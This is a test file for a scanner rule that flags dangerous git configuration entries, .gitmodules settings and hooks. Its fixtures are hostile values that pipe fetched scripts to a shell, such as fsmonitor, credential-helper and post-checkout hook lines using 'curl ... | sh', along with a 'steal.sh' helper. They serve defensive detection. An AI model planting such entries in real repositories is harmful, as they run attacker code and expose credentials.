import { describe, expect, it } from "vitest";
import type { RepoEntry, RepoSnapshot } from "../repo-snapshot.ts";
import { gitConfig } from "./git-config.ts";

function repo(files: Record<string, string>): RepoSnapshot {
  const entries: RepoEntry[] = Object.keys(files).map((path) => ({
    path,
    kind: "file",
    size: 1,
  }));
  return { entries, read: (path) => files[path] };
}
const scan = (files: Record<string, string>) => gitConfig(repo(files));
const config = (body: string) => ({
  ".git/config": `[core]\n\trepositoryformatversion = 0\n${body}`,
});

describe("repo/git-config", () => {
  it("is quiet for a fresh clone's config", () => {
    const fresh = `[core]\n\tbare = false\n[remote "origin"]\n\turl = https://x.invalid/r.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch "main"]\n\tremote = origin\n`;
    expect(scan({ ".git/config": fresh })).toEqual([]);
  });

  it.each([
    [
      "core.fsmonitor command",
      "\tfsmonitor = curl x.invalid | sh",
      "git status",
    ],
    ["core.sshCommand", "\tsshCommand = sh -c 'id > /tmp/x'", "fetch"],
    ["core.pager", "\tpager = sh payload.sh", "pager"],
    ["diff.external", "[diff]\n\texternal = ./d.sh", "diff"],
    ["filter smudge", `[filter "x"]\n\tsmudge = sh s.sh`, "checkout"],
    [
      "credential helper command",
      "[credential]\n\thelper = !sh steal.sh",
      "credentials",
    ],
    [
      "submodule update command",
      `[submodule "lib"]\n\tupdate = !sh x.sh`,
      "submodule",
    ],
  ])("blocks %s", (_name, body, when) => {
    const [finding] = scan(config(body));
    expect(finding).toMatchObject({
      ruleId: "repo/git-config",
      severity: "block",
      file: ".git/config",
    });
    expect(finding?.message).toContain(when);
  });

  it.each([
    [
      "LFS filter with a chained command",
      `[filter "lfs"]\n\tsmudge = git-lfs smudge -- %f && curl x | sh`,
    ],
    [
      "credential helper with a chained command",
      "[credential]\n\thelper = store && sh x.sh",
    ],
    ["diff textconv", `[diff "pdf"]\n\ttextconv = sh x.sh`],
    ["merge driver", `[merge "ours"]\n\tdriver = sh x.sh %O %A %B`],
    ["per-command pager", "[pager]\n\tlog = sh x.sh"],
    ["core.gitProxy", "\tgitProxy = sh x.sh"],
    ["remote uploadpack", `[remote "origin"]\n\tuploadpack = sh x.sh`],
    ["difftool cmd", `[difftool "x"]\n\tcmd = sh x.sh`],
  ])("blocks %s", (_name, body) => {
    expect(scan(config(body))[0]?.severity).toBe("block");
  });

  it("does not flag boolean fsmonitor or a named credential helper", () => {
    expect(
      scan(config("\tfsmonitor = true\n[credential]\n\thelper = osxkeychain")),
    ).toEqual([expect.objectContaining({ severity: "info" })]);
  });

  it("notes Git LFS filters instead of blocking them", () => {
    expect(
      scan(
        config(
          `[filter "lfs"]\n\tclean = git-lfs clean -- %f\n\tsmudge = git-lfs smudge -- %f`,
        ),
      ).map((f) => f.severity),
    ).toEqual(["info", "info"]);
  });

  it.each([
    ["core.hooksPath", "\thooksPath = .githooks"],
    ["include.path", "[include]\n\tpath = ../evil.config"],
    ["shell alias", "[alias]\n\tst = !sh x.sh"],
  ])("warns on %s", (_name, body) => {
    expect(scan(config(body))[0]?.severity).toBe("warn");
  });

  it("checks .gitmodules too", () => {
    expect(
      scan({
        ".gitmodules": `[submodule "lib"]\n\tpath = lib\n\tupdate = !sh x.sh\n`,
      })[0],
    ).toMatchObject({
      severity: "block",
      file: ".gitmodules",
      line: 3,
    });
  });

  it("warns on an active hook and blocks one that downloads and executes", () => {
    expect(
      scan({ ".git/hooks/post-checkout": "#!/bin/sh\nnpm test\n" })[0]
        ?.severity,
    ).toBe("warn");
    expect(
      scan({
        ".git/hooks/post-checkout":
          "#!/bin/sh\ncurl -s https://x.invalid/i | sh\n",
      })[0]?.severity,
    ).toBe("block");
    expect(
      scan({ ".git/hooks/pre-commit.sample": "#!/bin/sh\nexit 0\n" }),
    ).toEqual([]);
  });

  it("checks nested .git directories and skips node_modules", () => {
    expect(
      scan({ "vendor/lib/.git/config": "[core]\n\tfsmonitor = sh x.sh\n" })[0]
        ?.severity,
    ).toBe("block");
    expect(
      scan({
        "node_modules/x/.gitmodules": `[submodule "a"]\n\tupdate = !sh x.sh\n`,
      }),
    ).toEqual([]);
  });
});
